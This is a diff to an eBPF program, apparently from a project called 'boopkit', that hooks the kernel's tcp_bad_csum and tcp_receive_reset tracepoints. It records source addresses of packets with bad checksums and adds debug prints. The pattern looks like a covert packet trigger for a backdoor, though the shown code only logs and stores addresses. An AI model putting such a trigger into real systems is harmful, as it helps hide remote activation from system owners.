@@ -66,7 +66,7 @@ struct tcp_bad_csum_args_t {
 // print fmt: "src=%pISpc dest=%pISpc", REC->saddr, REC->daddr
 SEC("tracepoint/tcp/tcp_bad_csum")
 int tcp_bad_csum(struct tcp_bad_csum_args_t  *args){
-    //bpf_printk("tcp_bad_csum saddr=%pI4", args->saddr);
+    bpf_printk("boopkit: tcp_bad_csum");
     int saddrkey = 1;
     struct tcp_return ret;
     memcpy(ret.saddr, args->saddr, sizeof(args->saddr));
@@ -77,3 +77,30 @@ int tcp_bad_csum(struct tcp_bad_csum_args_t  *args){
 // SPDX-License-Identifier: GPL-2.0
 // The eBPF probe is dual-licensed with GPL because Linux is a fucking shit show.
 char LICENSE[] SEC("license") = "GPL";
+
+struct tcp_receive_reset_args_t {
+  __u64 pad1;
+  __u64 pad2;
+};
+
+// name: tcp_receive_reset
+// ID: 1368
+// format:
+//        field:unsigned short common_type;       offset:0;       size:2; signed:0; field:unsigned char common_flags;       offset:2; size:1; signed:0; field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0; field:int common_pid;   offset:4;       size:4; signed:1;
+//
+//        field:const void * skaddr;      offset:8;       size:8; signed:0;
+//        field:__u16 sport;      offset:16;      size:2; signed:0;
+//        field:__u16 dport;      offset:18;      size:2; signed:0;
+//        field:__u16 family;     offset:20;      size:2; signed:0;
+//        field:__u8 saddr[4];    offset:22;      size:4; signed:0;
+//        field:__u8 daddr[4];    offset:26;      size:4; signed:0;
+//        field:__u8 saddr_v6[16];        offset:30;      size:16; signed:0;
+//        field:__u8 daddr_v6[16];        offset:46;      size:16; signed:0;
+//        field:__u64 sock_cookie;        offset:64;      size:8; signed:0;
+//
+// print fmt: "family=%s sport=%hu dport=%hu saddr=%pI4 daddr=%pI4 saddrv6=%pI6c daddrv6=%pI6c sock_cookie=%llx", __print_symbolic(REC->family, { 2, "AF_INET" }, { 10, "AF_INET6" }), REC->sport, REC->dport, REC->saddr, REC->daddr, REC->saddr_v6, REC->daddr_v6, REC->sock_cookie
+SEC("tracepoint/tcp/tcp_receive_reset")
+int tcp_receive_reset(struct tcp_receive_reset_args_t *args) {
+  bpf_printk("boopkit: tcp_receive_rest");
+  return 0;
+}
